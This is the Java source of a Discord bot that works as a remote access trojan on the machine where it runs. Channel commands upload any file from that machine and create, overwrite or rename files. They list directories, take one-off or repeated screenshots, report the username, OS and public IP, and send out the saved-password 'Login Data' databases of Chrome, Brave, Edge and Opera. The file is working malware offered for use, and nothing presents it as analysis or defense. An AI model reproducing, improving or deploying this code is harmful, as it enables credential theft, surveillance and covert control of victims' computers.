

import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.URL;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.List;

import javax.imageio.ImageIO;

import net.dv8tion.jda.api.EmbedBuilder;
import net.dv8tion.jda.api.events.message.MessageReceivedEvent;
import net.dv8tion.jda.api.hooks.ListenerAdapter;
import net.dv8tion.jda.api.utils.FileUpload;

public class Message extends ListenerAdapter {


	

	public void onMessageReceived(MessageReceivedEvent e)
	{
		String[] msg = e.getMessage().getContentRaw().split("\\s+");
		File windows;
		File linux;
		File file;	// they type a file directory and then its put inside File constructor
		File user; 	// This is for System.getProperty("user.name") validation
		File fileX; // for .search and .file [If there's a space in the file, just put X]
		String x;	//	Ex: .search /home/chillydogs/hello world -> .search /home/chillydogs/helloXworld
		String y; // This is for .fileWrite and .fileAppend
		File folder;
		FileWriter writer;
		String text;
		File name;
		File fileY;
		Date cd = new Date();
		SimpleDateFormat date = new SimpleDateFormat("MM/dd/yyyy");
		SimpleDateFormat time = new SimpleDateFormat("hh:mm:ss");

		
		
		
				// LIST OF COMMANDS
				if(msg[0].equalsIgnoreCase(".commands"))
				{
					EmbedBuilder eb = new EmbedBuilder();
					eb.setTitle("All commands");
					eb.setDescription
									("If there is a file you are attempting to create/search/download put space in placement of the space"+"\n"
									+".commands (Shows the list of current commands)"+"\n"
									+".file *FILE DIRECTORY* (Downloads a file)"+"\n"
									+".fileCreate *FILE DIRECTORY* (Creates a file)" +"\n"
									+".fileWrite *FILE DIRECTORY* *MESSAGE* (Writes a message to a file but overwrites everyting else)"+"\n"
									+".fileAppend *FILE DIRECTORY* *MESSAGE* (Writes a message to file but appends the message to previous text)"+"\n"
									+".fileExists *FILE DIRECTORY* (Checks if a file exists)" +"\n"
									+".fileRename *FILE DIRECTORY* *FILE DIRECTORY fileNewName* (Renames a file)"+"\n"
									+".fileUser *FILE DIRECTORY* *USER NAME*  (Same thing as .file but you have to specify a username as well)"+"\n"
									+".search *FILE DIRECTORY* (Lists all files within a directory)"+"\n"
									+".searchUser *FILE DIRECTORY* *USER NAME* (Same thing as .search but you have to specify a username as well)"+"\n"
									+".root *USER NAME* (Lists all drives/root directories)"+"\n"
									+".grab passwords *USER NAME* (Windows Only) (Downloads all password files except Firefox)"+"\n"
									+".ss *USER NAME* (Takes screenshot of user's pc and uploads it here)"+"\n"
									+".info  (Lists various bits of info about the user's computer)"+"\n"
									+".ls *USER NAME* (The current directory the user is in)"+"\n"
									+".usersOnline (Shows every user online)" +"\n"
									+".*BROWSER* (Sends a message of a specific browser's filepath)"+"\n"
									+".clear *NUMBER* (Clears 1-99 messages)"+"\n"
									+".ss start *USER NAME* *5-10-20-30s or 1-5* (Takes screenshots of user's pc every specificed amount of time)"+"\n"
									+"(EX: .ss start jessy 5s or .ss start jessy 1)"+"\n"
									+".kill (Terminates the .ss start)");
					
					e.getChannel().sendMessageEmbeds(eb.build()).queue();
				}
				// DOWNLOAD ANY FILE  (spacing works)
				else if(msg[0].equalsIgnoreCase(".file"))
				{
					
					file = new File(msg[1]);
	
					if(file.toString().contains("_space_"))
					{
						x = msg[1].replace("_space_"," ");
						fileX = new File(x);
						e.getChannel().sendFiles(FileUpload.fromData(fileX,msg[1])).queue();
						
					}
					else if(file.exists())
					{
						e.getChannel().sendFiles(FileUpload.fromData(file,msg[1])).queue();
					}else {
						EmbedBuilder eb = new EmbedBuilder();
						eb.setTitle("Oops");
						eb.setDescription("The file you tried to download doesn't exist.");
						eb.setImage("https://wompampsupport.azureedge.net/fetchimage?siteId=7575&v=2&jpgQuality=100&width=700&url=https%3A%2F%2Fi.kym-cdn.com%2Fentries%2Ficons%2Ffacebook%2F000%2F041%2F998%2FScreen_Shot_2022-09-23_at_10.40.58_AM.jpg");
						e.getChannel().sendMessageEmbeds(eb.build()).queue();
					}
				
				}
				// CREATES A FILE (spacing works)
				else if(msg[0].equalsIgnoreCase(".fileCreate"))
				{
					file = new File(msg[1]);
					//user = new File(msg[2]);
					if(!file.exists())
					{
						try
						{
							x = msg[1].replace("_space_"," ");
							fileX = new File(x);
							
							if(file.toString().contains("_space_"))
							{
								fileX.createNewFile();
							}else if(!file.toString().contains("_space_"))
							{
								file.createNewFile();
							}
							
						}catch(IOException t)
						{
							t.printStackTrace();
						}
					}else {
						EmbedBuilder eb = new EmbedBuilder();
						eb.setTitle("Oops");
						eb.setDescription("The file you tried to create already exists >:]");
						eb.setImage("https://wompampsupport.azureedge.net/fetchimage?siteId=7575&v=2&jpgQuality=100&width=700&url=https%3A%2F%2Fi.kym-cdn.com%2Fentries%2Ficons%2Ffacebook%2F000%2F041%2F998%2FScreen_Shot_2022-09-23_at_10.40.58_AM.jpg");
						e.getChannel().sendMessageEmbeds(eb.build()).queue();
					}
				}
				//WRITES TO A FILE (OVERWRITE)
				else if(msg[0].equalsIgnoreCase(".fileWrite"))
				{
					file = new File(msg[1]);
					text = msg[2];
					x = file.toString().replace("_space_", " ");
					fileX = new File(x);
					//y = text.replace("_space_", " ");
			
					if(file.exists())
					{
						try {
								writer = new FileWriter(file,false);
								if(text.contains("_space_"))
								{
									y = text.replace("_space_", " ");
									writer.write(y);
									writer.close();
								}else if(!text.contains("_space_"))
								{
									writer.write(text);
									writer.close();
								}
						}catch(IOException t)
						{
							t.printStackTrace();
						}
					}else if(fileX.exists())
					{
						try {
							writer = new FileWriter(fileX,false);
							if(text.contains("_space_"))
							{
								y = text.replace("_space_", " ");
								writer.write(y);
								writer.close();
							}else if(!text.contains("_space_"))
							{
								writer.write(text);
								writer.close();
							}
						}catch(IOException t)
						{
							t.printStackTrace();
						}
					}else {
						EmbedBuilder eb = new EmbedBuilder();
						eb.setTitle("Oops");
						eb.setDescription("There was an error writing to that file, maybe it doesn't exist?");
						eb.setImage("https://wompampsupport.azureedge.net/fetchimage?siteId=7575&v=2&jpgQuality=100&width=700&url=https%3A%2F%2Fi.kym-cdn.com%2Fentries%2Ficons%2Ffacebook%2F000%2F041%2F998%2FScreen_Shot_2022-09-23_at_10.40.58_AM.jpg");
						e.getChannel().sendMessageEmbeds(eb.build()).queue();
					}
				}
				// APPENDS TO A FILE
				else if(msg[0].equalsIgnoreCase(".fileAppend"))
				{
					file = new File(msg[1]);
					text = msg[2];
					x = file.toString().replace("_space_", " ");
					fileX = new File(x);
					//y = text.replace("_space_", " ");
			
					if(file.exists())
					{
						try {
							writer = new FileWriter(file,true);
								if(text.contains("_space_"))
								{
									y = text.replace("_space_", " ");
									writer.append(y);
								}else if(!text.contains("_space_"))
								{
									writer.append(text);	
								}
								writer.close();
						}catch(IOException t)
						{
							t.printStackTrace();
						}
					}else if(fileX.exists())
					{
						try {
							writer = new FileWriter(fileX,true);
							if(text.contains("_space_"))
							{
								y = text.replace("_space_", " ");
								writer.append(y);
							}else if(!text.contains("_space_"))
							{
								writer.append(text);
							}
							writer.close();
						}catch(IOException t)
						{
							t.printStackTrace();
						}
					}else {
						EmbedBuilder eb = new EmbedBuilder();
						eb.setTitle("Oops");
						eb.setDescription("There was an error writing to that file, maybe it doesn't exist?");
						eb.setImage("https://wompampsupport.azureedge.net/fetchimage?siteId=7575&v=2&jpgQuality=100&width=700&url=https%3A%2F%2Fi.kym-cdn.com%2Fentries%2Ficons%2Ffacebook%2F000%2F041%2F998%2FScreen_Shot_2022-09-23_at_10.40.58_AM.jpg");
						e.getChannel().sendMessageEmbeds(eb.build()).queue();
					}
				}
				// CHECKS IF A FILE EXISTS
				else if(msg[0].equalsIgnoreCase(".fileExists"))
				{
					file = new File(msg[1]);
					x = file.toString().replace("_space_", " ");
					fileX = new File(x);
					
					if(file.exists() || fileX.exists())
					{
						e.getChannel().sendMessage("That file exists").queue();;
					}else if(!file.exists() || !fileX.exists())
					{
						EmbedBuilder eb = new EmbedBuilder();
						eb.setTitle("Oops");
						eb.setDescription("That file doesn't exist :O");
						eb.setImage("https://wompampsupport.azureedge.net/fetchimage?siteId=7575&v=2&jpgQuality=100&width=700&url=https%3A%2F%2Fi.kym-cdn.com%2Fentries%2Ficons%2Ffacebook%2F000%2F041%2F998%2FScreen_Shot_2022-09-23_at_10.40.58_AM.jpg");
						e.getChannel().sendMessageEmbeds(eb.build()).queue();
					}
				}
				//RENAMES A FILE
				else if(msg[0].equalsIgnoreCase(".fileRename"))
				{
					file = new File(msg[1]);
					x = file.toString().replace("_space_", " ");
					fileX = new File(x);
					name = new File(msg[2]);
					y = name.toString().replace("_space_", " ");
					fileY = new File(y);
					
					if(file.exists())
					{
						if(fileY.exists())
						{
							file.renameTo(fileY);
						}else if(!fileY.exists())
						{
							file.renameTo(name);
						}
					}else if(fileX.exists())
					{
						if(fileY.exists())
						{
							fileX.renameTo(fileY);
						}else if(!fileY.exists())
						{
							fileX.renameTo(name);
						}
					}else {
						EmbedBuilder eb = new EmbedBuilder();
						eb.setTitle("Oops");
						eb.setDescription("Something went wrong with renaming the file >:[");
						eb.setImage("https://wompampsupport.azureedge.net/fetchimage?siteId=7575&v=2&jpgQuality=100&width=700&url=https%3A%2F%2Fi.kym-cdn.com%2Fentries%2Ficons%2Ffacebook%2F000%2F041%2F998%2FScreen_Shot_2022-09-23_at_10.40.58_AM.jpg");
						e.getChannel().sendMessageEmbeds(eb.build()).queue();
					}
					
					
				}
				// .FILE BUT WITH A USERNAME REQUIREMENT
				else if(msg[0].equalsIgnoreCase(".fileUser"))
				{
					file = new File(msg[1]);
				
					if(file.toString().contains("_space_"))
					{
						x = msg[1].replace("_space_"," ");
						fileX = new File(x);
						
						if(fileX.exists())
						{
							e.getChannel().sendFiles(FileUpload.fromData(fileX,msg[1])).queue();
						}
						}else if(file.exists() && msg[2].equalsIgnoreCase(System.getProperty("user.name")))
						{
							e.getChannel().sendFiles(FileUpload.fromData(file,msg[1])).queue();
						}
						else {
							EmbedBuilder eb = new EmbedBuilder();
							eb.setTitle("Oops");
							eb.setDescription("The file you tried to download doesn't exist or the username is wrong.");
							eb.setImage("https://wompampsupport.azureedge.net/fetchimage?siteId=7575&v=2&jpgQuality=100&width=700&url=https%3A%2F%2Fi.kym-cdn.com%2Fentries%2Ficons%2Ffacebook%2F000%2F041%2F998%2FScreen_Shot_2022-09-23_at_10.40.58_AM.jpg");
							e.getChannel().sendMessageEmbeds(eb.build()).queue();
						}
					
					
				}
				// SEARCH FOR FILES
				else if(msg[0].equalsIgnoreCase(".search"))
				{
					folder = new File(msg[1]);
					
					if(folder.toString().contains("_space_"))
					{
						x = msg[1].replace("_space_"," ");
						fileX = new File(x);
						if(fileX.exists())
						{
							for(String f : fileX.list())
							{
								e.getChannel().sendMessage(f +" ["+System.getProperty("user.name")+"]").queue();
							}
						}
					}
					else if(folder.exists())
					{
						
						for(String f : folder.list())
						{
							e.getChannel().sendMessage(f+" ["+System.getProperty("user.name")+"]").queue();
						}
					}else if(!folder.exists()){
						EmbedBuilder eb = new EmbedBuilder();
						eb.setTitle("Oops");
						eb.setDescription("The file you searched doesn't exist.");
						eb.setImage("https://wompampsupport.azureedge.net/fetchimage?siteId=7575&v=2&jpgQuality=100&width=700&url=https%3A%2F%2Fi.kym-cdn.com%2Fentries%2Ficons%2Ffacebook%2F000%2F041%2F998%2FScreen_Shot_2022-09-23_at_10.40.58_AM.jpg");
						e.getChannel().sendMessageEmbeds(eb.build()).queue();
					}
				}
				// .SEARCH BUT WITH A USERNAME REQUIREMENT
				else if(msg[0].equalsIgnoreCase(".searchUser"))
				{
					folder = new File(msg[1]);
					
					if(folder.toString().contains("_space_") && msg[2].equalsIgnoreCase(System.getProperty("user.name")))
					{
						x = msg[1].replace("_space_"," ");
						fileX = new File(x);
						if(fileX.exists())
						{
							for(String f : fileX.list())
							{
								e.getChannel().sendMessage(f +" ["+System.getProperty("user.name")+"]").queue();
							}
						}
					}
					else if(folder.exists() && msg[2].equalsIgnoreCase(System.getProperty("user.name")))
					{
						
						for(String f : folder.list())
						{
							e.getChannel().sendMessage(f +" ["+System.getProperty("user.name")+"]").queue();
						}
					}else {
						
						EmbedBuilder eb = new EmbedBuilder();
						eb.setTitle("Oops");
						eb.setDescription("The file you searched either doesn't exist or the username is wrong.");
						eb.setImage("https://wompampsupport.azureedge.net/fetchimage?siteId=7575&v=2&jpgQuality=100&width=700&url=https%3A%2F%2Fi.kym-cdn.com%2Fentries%2Ficons%2Ffacebook%2F000%2F041%2F998%2FScreen_Shot_2022-09-23_at_10.40.58_AM.jpg");
						e.getChannel().sendMessageEmbeds(eb.build()).queue();
					}
				}
				else if(msg[0].equalsIgnoreCase(".root"))
				{
					
					windows = new File("C:\\Users\\"+msg[1]);
					linux = new File("/home/"+msg[1]);
					
					if(windows.exists())
					{
						for(File t : windows.listRoots())
						{
							e.getChannel().sendMessage(t.toString()).queue();
						}
					}else if(linux.exists())
					{
						for(File t : linux.listRoots())
						{
							e.getChannel().sendMessage(t.toString()).queue();
						}
					}
					
					
				}
				// DOWNLOADS PASSWORD FILES FROM WEB BROWSERS
				else if(msg[0].equalsIgnoreCase(".grab") && msg[1].equalsIgnoreCase("passwords"))
				{
			
					
					
			
					File opera = new File("C:\\Users\\"+msg[2]+"\\AppData\\Roaming\\Opera Software\\Opera GX Stable\\Login Data");
					if(opera.exists()) 
					{
						
						e.getChannel().sendFiles(FileUpload.fromData(opera,"Opera")).queue();
					}
					File chrome = new File("C:\\Users\\"+msg[2]+"\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data");
					if(chrome.exists()) 
					{
						e.getChannel().sendFiles(FileUpload.fromData(chrome,"Chrome")).queue();
					}
					File brave = new File("C:\\Users\\"+msg[2]+"\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Login Data");
					if(brave.exists()) 
					{
						e.getChannel().sendFiles(FileUpload.fromData(brave,"Brave")).queue();
					}
					File edge = new File("C:\\Users\\"+msg[2]+"\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Login Data");
					e.getChannel().sendFiles(FileUpload.fromData(edge,"Edge")).queue();
				
				}
				// TAKES SCREENSHOT,UPLOADS IT, THEN DELETES IT.
				else if(msg[0].equalsIgnoreCase(".ss"))
				{
					try
					{
						windows = new File("C:\\Users\\"+msg[1]);
						linux = new File("/home/"+msg[1]);
						
						BufferedImage image = new Robot().createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
						ImageIO.write(image, "png", new File("screenshot.png"));
						file = new File("screenshot.png");
				
						EmbedBuilder eb = new EmbedBuilder();
						eb.setTitle(msg[1]+" ["+time.format(cd)+" - "+date.format(cd)+"]");
						eb.setImage("attachment://screenshot.png");
						
						if(windows.exists())
						{
						e.getChannel().sendMessageEmbeds(eb.build())
						.addFiles(FileUpload.fromData(file, "screenshot.png"))
							.queue();
						}else if(linux.exists())
						{
						e.getChannel().sendMessageEmbeds(eb.build())
						.addFiles(FileUpload.fromData(file, "screenshot.png"))
							.queue();
						}
				
						file.delete();
					}catch(Exception t)
					{
						t.printStackTrace();
					}
				}
				// RETRIEVES INFO ABOUT THE USER.
				else if(msg[0].equalsIgnoreCase(".info"))
				{
					try
					{
						URL whatismyip = new URL("http://checkip.amazonaws.com");
						BufferedReader in = new BufferedReader(new InputStreamReader(whatismyip.openStream()));
			            String ip = in.readLine();
			
			            EmbedBuilder eb = new EmbedBuilder();
			            eb.setTitle("Info:");
			            eb.setImage("https://i.4cdn.org/s4s/1687711282184223s.jpg");
			            eb.setDescription("Operating system architecture: "+System.getProperty("os.arch")+"\n"+"Name of Operating System: "+System.getProperty("os.name")
			            +"\n"+"Username: "+System.getProperty("user.name")+"\n"+"Home Directory: "+System.getProperty("user.home")+"\n"+"User's Directory: "+System.getProperty("user.dir")
			            +"\nUser's IP Address: "+ip);
			
			            e.getChannel().sendMessageEmbeds(eb.build()).queue();
			
						}catch(Exception t)
						{
							t.printStackTrace();
						}
				}
				// CURRENT DIRECTORY OF THE USER.
				else if(msg[0].equalsIgnoreCase(".ls"))
				{
					String directory = System.getProperty("user.dir");
			
					windows = new File("C:\\Users\\"+msg[1]);
					linux = new File("/home/"+msg[1]);
					
					if(windows.exists())
					{
						e.getChannel().sendMessage(directory).queue();
					}else if(linux.exists())
					{
						e.getChannel().sendMessage(directory).queue();
					}else
					{
						e.getChannel().sendMessage("Maybe they're using Mac???").queue();
					}
		
				}
				else if(msg[0].equalsIgnoreCase(".usersOnline"))
				{
					
					EmbedBuilder eb = new EmbedBuilder();
					eb.setTitle("Users Online:");
					eb.setImage("https://i.kym-cdn.com/photos/images/newsfeed/002/564/498/74a.jpg");
					eb.setDescription(System.getProperty("user.name")+" ["+System.getProperty("os.name")+"]"+"\n");
			
					e.getChannel().sendMessageEmbeds(eb.build()).queue();
				}	
				else if(msg[0].equalsIgnoreCase(".edge"))
				{
					e.getChannel().sendMessage("C:\\Users\\"+"USER NAME"+"\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default").queue();
				}else if(msg[0].equalsIgnoreCase(".brave")) 
				{
					e.getChannel().sendMessage("C:\\Users\\"+"USER NAME"+"\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default").queue();				
				}else if(msg[0].equalsIgnoreCase(".opera"))
				{
					e.getChannel().sendMessage("C:\\Users\\"+"USER NAME"+"\\AppData\\Roaming\\Opera Software\\Opera GX Stable").queue();
				}else if(msg[0].equalsIgnoreCase(".chrome"))
				{
					e.getChannel().sendMessage("C:\\Users\\"+"USER NAME"+"\\AppData\\Local\\Google\\Chrome\\User Data\\Default").queue();
				}else if(msg[0].equalsIgnoreCase(".firefox"))
				{
					e.getChannel().sendMessage("C:\\Users\\USER NAME\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles").queue();
				}
				
				else if(msg[0].equalsIgnoreCase(".clear"))
				{
					int num = Integer.parseInt(msg[1]);
					if(msg.length < 2)
					{
						e.getChannel().sendMessage("wrong").queue();
					}else {
						List<net.dv8tion.jda.api.entities.Message> mm = e.getChannel().getHistory().retrievePast(num).complete();
					e.getChannel().purgeMessages(mm);
			
					}
					
				}
	

	
	

	
	
				}
}
